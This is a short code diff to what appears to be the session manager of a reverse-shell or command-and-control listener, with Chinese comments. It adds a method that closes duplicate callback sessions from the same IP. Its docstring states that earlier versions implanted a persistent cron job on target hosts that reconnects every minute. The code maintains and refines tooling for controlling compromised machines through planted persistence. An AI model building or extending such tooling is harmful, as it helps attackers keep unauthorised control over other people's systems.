@@ -184,11 +184,30 @@ class SessionManager:
             with self._lock:
                 self.sessions[sess.id] = sess
             self._log("[+] 新会话 #%d ← %s（端口 %d）" % (sess.id, sess.addr, port))
+            self._prune_duplicates(sess)
             if self.on_new_session:
                 try:
                     self.on_new_session(sess)
                 except Exception:
                     pass
+
+    def _prune_duplicates(self, sess):
+        """同一来源 IP 的旧存活会话自动关闭，只保留最新。
+
+        场景：历史版本植入的常驻 cron 每分钟重连，会把会话表刷满；
+        收纳为"同源只留最新"后，残留 cron 的重连变成无害噪音。
+        """
+        ip = sess.addr.rsplit(":", 1)[0]
+        with self._lock:
+            olds = [s for s in self.sessions.values()
+                    if s.id != sess.id and s.alive
+                    and s.addr.rsplit(":", 1)[0] == ip]
+        for s in olds:
+            s.close()
+            with self._lock:
+                self.sessions.pop(s.id, None)
+            self._log("[i] 同源旧会话 #%d（%s）已自动关闭，保留最新 #%d"
+                      % (s.id, s.addr, sess.id))
 
     # ---- 会话操作 ----
     def get(self, sid):
